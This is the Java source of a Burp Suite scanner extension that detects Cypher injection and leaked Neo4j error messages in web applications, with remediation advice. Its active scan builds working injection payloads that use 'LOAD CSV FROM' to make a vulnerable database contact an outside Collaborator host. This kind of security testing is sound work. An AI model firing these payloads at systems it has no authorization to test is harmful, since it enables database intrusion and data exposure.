package burp;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class BurpExtender implements IBurpExtender, IScannerCheck {
    private String extensionName = "Cypher Injection Scanner";
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private Monitor monitor;
    
    private static final byte[] NEO4J_ERROR = "Neo4jError: ".getBytes();
    
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        stdout = new PrintWriter(callbacks.getStdout(), true);
        
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName(extensionName);
        monitor = new Monitor(stdout, callbacks);
        new Thread(monitor).start();
        // register ourselves as a custom scanner check
        callbacks.registerScannerCheck(this);
        callbacks.registerExtensionStateListener(monitor);
    }
    
    /** 
     * helper method to search a response for occurrences of a literal match string
     * @return a list of start/end offsets */
    public static List<int[]> getMatches(IExtensionHelpers helpers, byte[] response, byte[] match) {
        List<int[]> matches = new ArrayList<int[]>();
        int start = 0;
        while (start < response.length) {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1)
                break;
            matches.add(new int[] { start, start + match.length });
            start += match.length;
        }
        
        return matches;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IScanIssue issue = searchDescriptiveError(baseRequestResponse);
        if (issue != null) {
            List<IScanIssue> issues = new ArrayList<>(1);
            issues.add(issue);
            return issues;
        }
        return null;
    }

    /**
     * receive a response and search the NEO4J_ERROR in it
     * @param baseRequestResponse
     * @param payload optional param
     * @param insertionPoint optional param
     * @return a issue or null if not find NEO4J_ERROR in response
     */
    public IScanIssue searchDescriptiveError(IHttpRequestResponse baseRequestResponse, String payload, IScannerInsertionPoint insertionPoint) {
        List<int[]> matches = getMatches(helpers, baseRequestResponse.getResponse(), NEO4J_ERROR);
        int[] requestHighlights = null;
        String param = "";
        if (payload.length() > 0) {
            requestHighlights = getHighlights(insertionPoint, payload);
            param = insertionPoint.getInsertionPointName(); 
        } 
        if (matches.size() > 0) {
            return new DescriptiveErrorIssue(baseRequestResponse, helpers, matches, Arrays.asList(requestHighlights), callbacks, helpers.bytesToString(NEO4J_ERROR), payload, param);
        };
        return null;
    }

    /**
     * show the searchDescriptiveError above
     */
    public IScanIssue searchDescriptiveError(IHttpRequestResponse baseRequestResponse) {
        return searchDescriptiveError(baseRequestResponse, "", null);
    }

    /** @return a string random of length size
     * @param size the hash length 
     */
    public String getHash(int size) {
        List<Character> alph = new ArrayList<Character>();
        for (char i = 'a'; i <= 'z' ; i++)
            alph.add(i);
        for (char i = 'A'; i <= 'Z' ; i++)
            alph.add(i);
        for (char i = '0'; i <= '9' ; i++)
            alph.add(i);
        
        String r = "";

        for (int i = 0; i < size; i++) {
            r += alph.get((int)(Math.random() * alph.size()));
        }
        return r;
    }

    /** @return a string payload */
    public String getPayload(String off1, String off2, String hash, boolean slash) {
        String offFinal = "";
        if (slash)
            offFinal = "//";
        else if (off1.length() > 0) //handling when payload is concat with quotes
            if (off2.equals("})")) offFinal = " MATCH(:Z{w:" + off1 + "3";
            else offFinal = " MATCH(:Z) WHERE " + off1 + "3" + off1 + "=" + off1 + "3";
        return off1 + off2 + "LOAD CSV FROM 'https://" + hash + "." + monitor.getUrl() + "' as yl" + offFinal;
    }


    /** @return a map with a random value as key and the respective payload as value */
    public HashMap<String, String> getPayloads() {
        HashMap<String, String> payloads = new HashMap<String, String>();
        for (String offset_one : Arrays.asList("", "\"", "'")) {
            for (String offset_two : Arrays.asList(" ", "})")) {
                String hash = getHash(8);
                payloads.put(hash, getPayload(offset_one, offset_two, hash, false)); 
                hash = getHash(8);
                payloads.put(hash, getPayload(offset_one, offset_two, hash, true));
            }
        }
        return payloads;
    }

    public static int[] getHighlights(IScannerInsertionPoint insertionPoint, String payload) {
        int[] requestHighlight = insertionPoint.getPayloadOffsets(payload.getBytes());
        return requestHighlight;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        //try error requests
        for (String payError : Arrays.asList("'", "\"", " or ", "a")) {
            byte[] checkRequest = insertionPoint.buildRequest(payError.getBytes());
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);
            IScanIssue issue = searchDescriptiveError(checkRequestResponse, payError, insertionPoint);
            
            // if found issue in the first time
            if (issue != null && issues.size() == 0) {
                issues.add(issue); 
            }
            
        }

        //try injection requests
        HashMap<String, String> payloads = getPayloads();
        HashMap<String, Object[]> requests = new HashMap<>();
        for (String hash : payloads.keySet()) {
            String payload = payloads.get(hash);
            String baseValue = insertionPoint.getBaseValue();
            if (baseValue != null)
                payload = baseValue + payload;
            byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());
            IHttpRequestResponse modifiedRequest = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
            requests.put(hash, new Object[]{ modifiedRequest, payload, insertionPoint, baseRequestResponse });

            //verify if reponse has error
            IScanIssue issue = searchDescriptiveError(modifiedRequest, payload, insertionPoint);
            if (issue != null && issues.size() == 0) {
                issues.add(issue);
            }
        }

        //analyze if any payload worked
        monitor.add(payloads, requests);

        return (issues.size() > 0) ? issues : null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        // This method is called when multiple issues are reported for the same URL 
        // path by the same extension-provided check. The value we return from this 
        // method determines how/whether Burp consolidates the multiple issues
        // to prevent duplication
        //
        // Since the issue name is sufficient to identify our issues as different,
        // if both issues have the same name, only report the existing issue
        // otherwise report both issues
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        else 
            return 0;
    }
}

class Monitor implements Runnable, IExtensionStateListener {
    private boolean stop; 
    private PrintWriter stdout;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private List<Object[]> requestsPayloads;
    private IBurpCollaboratorClientContext collaborator;
    private String urlCollaborator;
    private Lock lock;
    private final int aliveTime = 5000;

    public Monitor(PrintWriter stdout, IBurpExtenderCallbacks callbacks) {
        this.stdout = stdout;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        stop = false;
        requestsPayloads = new ArrayList<>();
        collaborator = callbacks.createBurpCollaboratorClientContext();
        urlCollaborator = collaborator.generatePayload(true);
        lock = new ReentrantLock();
    }

    public String getUrl() {
        return urlCollaborator;
    }

    public void extensionUnloaded() {
        stdout.println("unloading");
        stop = true;
        Thread.currentThread().interrupt();
    }

    public void add(HashMap<String, String> payloads, HashMap<String, Object[]> requests) {
        boolean notAdd = true;
        while (notAdd) {
            if(lock.tryLock()) {
                try {
                    this.requestsPayloads.add(new Object[]{payloads,requests, System.currentTimeMillis()});
                } finally {
                    lock.unlock();
                    notAdd = false;
                }
            }
        }
    }

    public void run() {
        try {
            while (!stop) {
                Thread.sleep(aliveTime*2);
                verify();
            }
        } catch (Exception e) {
            stdout.println("Error fetching/handling interactions: "+e.getMessage());
        }
    }

    /** @return all the dns querys received by the burp collaborator client */
    public List<String> getDNSQuerys() {
        List<String> dnsQuerys = new ArrayList<String>();
        List<IBurpCollaboratorInteraction> interactions = collaborator.fetchAllCollaboratorInteractions();
        for (IBurpCollaboratorInteraction interaction : interactions) {
            if (interaction.getProperty("query_type") != null) {
                String base64Query = interaction.getProperty("raw_query");
                String query = helpers.bytesToString(helpers.base64Decode(base64Query));
                dnsQuerys.add(query);
            }
        }
        return dnsQuerys;
    }

    public void verify() {
        //gets burp collaborator interactions
        if (lock.tryLock()) {
            try {
                // stdout.println("getDNSQuerys");
                long time = System.currentTimeMillis();
                List<String> dnsQuerys = getDNSQuerys();
                for (String query : dnsQuerys) {
                    
                    for (Object[] rp : this.requestsPayloads) {
                        HashMap<String, String> payloads = (HashMap<String,String>) rp[0];
                        HashMap<String, Object[]> requests = (HashMap<String,Object[]>) rp[1];
        
                        for (String hash : payloads.keySet()) {
                            List<int[]> queryMatches = BurpExtender.getMatches(helpers, query.getBytes(), hash.getBytes());
                            //if find the request that generated the received hash 
                            if (queryMatches.size() > 0) { 
                                IHttpRequestResponse mRequest = (IHttpRequestResponse) requests.get(hash)[0];
                                String payload = (String) requests.get(hash)[1];
                                IScannerInsertionPoint insertionPoint = (IScannerInsertionPoint) requests.get(hash)[2];
                                IHttpRequestResponse baseRequestResponse = (IHttpRequestResponse) requests.get(hash)[3];
                                int[] requestHighlight = BurpExtender.getHighlights(insertionPoint, payload);
                                IScanIssue issue = new CypherInjectionIssue(baseRequestResponse, mRequest, helpers, Arrays.asList(requestHighlight), callbacks, payload, insertionPoint.getInsertionPointName());
                                callbacks.addScanIssue(issue);
                                rp[2] = (long)0; //found payload then mark to remove this element from requestsPayloads
                            }
                        }
                    }
                }
                //removing payloads 
                for (int i=0; i<this.requestsPayloads.size(); i++) {
                    long age = (long) requestsPayloads.get(i)[2];
                    if ((time - age) > aliveTime) {
                        requestsPayloads.remove(i);
                        i--;
                    }
                }
            } finally {
                lock.unlock();
            }
        }
        
    }
}

class CypherInjectionIssue extends CustomScanIssue {

    private static String detail = "When placing the value <b>$PAYLOAD</b> in the request parameter <b>$PARAM</b>, a Cypher injection occurs.<br/><br/>Cypher injection vulnerabilities arise when user-controllable data is incorporated into Cypher queries in an unsafe manner. An attacker can supply crafted input to break out of the data context and interfere with the structure of the surrounding query.<br/><br/>A wide range of damaging attacks can often be delivered via Cypher injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.";
    private static String remediation = "The most effective way to prevent Cypher injection attacks is by using parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into Cypher queries:<br/><ul><li>First, the application specifies the structure of the query, leaving placeholders for each item of user input;</li><li>Second, the application specifies the contents of each placeholder.</li></ul><br/>As the query structure has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure.<br/><br/>If the parameterized queries cannot by applied, as in the case of a label name, it is recommended to use a whitelist.";
    private static String references = "<br/><br/><b>References</b><br/><ul><li><a href='https://neo4j.com/docs/cypher-manual/current/syntax/parameters/' rel='noopener'>Parameters Session in The Neo4j Cypher Manual</a></li><li><a href='https://www.owasp.org/index.php/Code_Injection' rel='noopener'>Code Injection - OWASP</a></li><li><a href='https://support.portswigger.net/customer/en/portal/articles/2590642-using-burp-to-test-for-code-injection-vulnerabilities' rel='noopener'>Using Burp to Test for Code Injection Vulnerabilities</a></li></ul><br/>";
    private static String classifications = "<b>Vulnerability classifications</b><br/><ul><li><a href='https://cwe.mitre.org/data/definitions/94.html' rel='noopener'>CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href='https://cwe.mitre.org/data/definitions/116.html' rel='noopener'>CWE-116: Improper Encoding or Escaping of Output</a></li></ul>";

    public CypherInjectionIssue(IHttpRequestResponse originalResponse, IHttpRequestResponse modifiedRequest, IExtensionHelpers helpers, List<int[]> requestHighlights, IBurpExtenderCallbacks callbacks, String payload, String param) {
        super(
            originalResponse.getHttpService(),
            helpers.analyzeRequest(originalResponse).getUrl(), 
            new IHttpRequestResponse[] { callbacks.applyMarkers(modifiedRequest, requestHighlights, null) }, 
            "Cypher injection",
            detail.replace("$PAYLOAD", payload).replace("$PARAM", param),
            remediation + "<br/>" + references + classifications,
            "Certain",
            "High");
    }

    
}

class DescriptiveErrorIssue extends CustomScanIssue {
    
    private static String detail1 = "When placing the value <b>$PAYLOAD</b> in the request parameter <b>$PARAM</b>, the application responds with a descriptive error.";
    private static String detail2 = "The response contains the string <b>$ERRORMSG</b>, indicating that the application uses the Cypher language and the Neo4j graph database. Some parts of the performed query may also be exposed.";
    private static String detail3 = " Moreover, this point can be vulnerable to Cypher Injection (use the active scan to verify it).";
    private static String remediation = "The application should handle all errors internally and reply with a generic error message.";
    private static String references = "<br/><br/><b>References</b><br/><ul><li><a href='https://www.owasp.org/index.php/Improper_Error_Handling' rel='noopener'>Improper Error Handling - OWASP</a></li></ul>";
    private static String classifications = "<br/><b>Vulnerability classifications</b><br/><ul><li><a href='https://cwe.mitre.org/data/definitions/209.html' rel='noopener'>CWE-209: Information Exposure Through an Error Message</a></li><li><a href='https://cwe.mitre.org/data/definitions/703.html' rel='noopener'>CWE-703: Improper Check or Handling of Exceptional Conditions</a></li></ul>";

    public DescriptiveErrorIssue(IHttpRequestResponse originalResponse, IExtensionHelpers helpers, List<int[]> responseHighlights, List<int[]> requestHighlights, IBurpExtenderCallbacks callbacks, String errorMsg, String payload, String param) {
        super(
            originalResponse.getHttpService(),
            helpers.analyzeRequest(originalResponse).getUrl(),
            new IHttpRequestResponse[] { callbacks.applyMarkers(originalResponse, requestHighlights, responseHighlights) },
            "Neo4j descriptive error",
            ((param.length() > 0) ? detail1.replace("$PAYLOAD", payload).replace("$PARAM", param) + "<br/><br/>" : "") + detail2.replace("$ERRORMSG", errorMsg) + ((param.length() > 0) ? "" : detail3),
            remediation + "<br/>" + references + classifications,
            "Firm",
            "Information");
    }
}

/** 
 * class implementing IScanIssue to hold our custom scan issue details
 */
class CustomScanIssue implements IScanIssue {
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String remediation;
    private String severity;
    private String confidence;

    public CustomScanIssue (
            IHttpService httpService,
            URL url, 
            IHttpRequestResponse[] httpMessages, 
            String name,
            String detail,
            String remediation,
            String confidence,
            String severity) {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.remediation = remediation;
        this.severity = severity;
        this.confidence = confidence;
    }
    
    @Override
    public URL getUrl() {
        return url;
    }

    @Override
    public String getIssueName() {
        return name;
    }

    @Override
    public int getIssueType() {
        return 0;
    }

    @Override
    public String getSeverity() {
        return severity;
    }

    @Override
    public String getConfidence() {
        return confidence;
    }

    @Override
    public String getIssueBackground() {
        return null;
    }

    @Override
    public String getRemediationBackground() {
        return null;
    }

    @Override
    public String getIssueDetail() {
        return detail;
    }

    @Override
    public String getRemediationDetail() {
        return remediation;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages() {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService() {
        return httpService;
    }
    
}